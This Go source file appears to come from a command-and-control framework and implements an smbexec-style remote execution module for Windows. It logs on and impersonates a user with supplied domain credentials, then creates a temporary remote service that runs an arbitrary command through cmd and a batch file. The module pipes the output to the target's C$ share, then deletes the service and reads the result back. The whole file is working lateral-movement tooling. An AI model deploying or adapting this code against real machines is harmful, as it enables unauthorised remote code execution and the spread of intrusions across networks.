//go:build windows
// +build windows

package exectools

import (
	"errors"
	"fmt"
	"strings"
	"syscall"
	"time"

	"github.com/google/uuid"
	"github.com/latortuga71/GoC2/pkg/winapi"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/svc/mgr"
)

func DeleteService(targetMachine, serviceName string) error {
	serviceMgr, err := mgr.ConnectRemote(targetMachine)
	if err != nil {
		return err
	}
	defer serviceMgr.Disconnect()
	service, err := serviceMgr.OpenService(serviceName)
	if err != nil {
		return err
	}
	defer service.Close()
	err = service.Delete()
	if err != nil {
		return err
	}
	return nil
}

func CreateService(targetMachine, serviceName, commandToExec string) (string, error) {
	serviceMgr, err := mgr.ConnectRemote(targetMachine)
	if err != nil {
		return "", err
	}
	defer serviceMgr.Disconnect()
	c := mgr.Config{}
	idErr := uuid.New()
	idOut := uuid.New()
	errFile := idErr.String()
	outFile := idOut.String()
	serviceBinary := fmt.Sprintf("%%COMSPEC%% /Q /c echo %s ^> \\\\127.0.0.1\\C$\\%s.txt 2^>^&1 > %%TMP%%\\%s.bat & %%COMSPEC%% /Q /c %%TMP%%\\%s.bat & del %%TMP%%\\%s.bat", commandToExec, outFile, errFile, errFile, errFile)
	c.BinaryPathName = serviceBinary
	service, err := CreateServiceWithoutEscape(serviceMgr.Handle, serviceBinary, serviceName)
	if err != nil {
		return "", err
	}
	defer service.Close()
	service.Start()
	return outFile, nil
}

func LogonUserToAccessSVM(domain, user, pass string) error {
	var hToken syscall.Handle
	ok, err := winapi.LogonUser(user, domain, pass, 9, 3, &hToken)
	if !ok {
		return err
	}
	worked, err := winapi.ImpersonateLoggedOnUser(windows.Token(hToken))
	if !worked {
		return err
	}
	return nil
}

func SmbExec(args []string) (string, error) {
	if len(args) < 4 {
		return "", errors.New("Not Enough Args.")
	}
	node := args[0]
	userName := args[1]
	userSlice := strings.Split(userName, "\\")
	if len(userSlice) < 2 {
		return "", errors.New("User Format Must Be DOMAIN\\User")
	}
	domainW := userSlice[0]
	userName = userSlice[1]
	password := args[2]
	command := args[3]
	err := LogonUserToAccessSVM(domainW, userName, password)
	if err != nil {
		return "", err
	}
	payloadPath, err := CreateService(node, "GOSMBEXEC", command)
	if err != nil {
		return "", err
	}
	time.Sleep(time.Second * 5)
	err = DeleteService(node, "GOSMBEXEC")
	if err != nil {
		return "", err
	}
	windows.RevertToSelf()
	data, err := ReadFileOnShare(node, userName, password, domainW, "C$", payloadPath+".txt")
	if err != nil {
		return "", err
	}
	return string(data), nil
}

func CreateServiceWithoutEscape(handle windows.Handle, serviceBinaryPath, serviceStartName string) (*mgr.Service, error) {
	binPath := windows.StringToUTF16Ptr(serviceBinaryPath)
	startName := windows.StringToUTF16Ptr(serviceStartName)
	h, err := windows.CreateService(handle, startName, startName, windows.SERVICE_ALL_ACCESS, 0x00000010, mgr.StartManual, mgr.ErrorIgnore, binPath, nil, nil, nil, nil, windows.StringToUTF16Ptr(""))
	if err != nil {
		return nil, err
	}
	return &mgr.Service{Name: serviceStartName, Handle: h}, nil
}
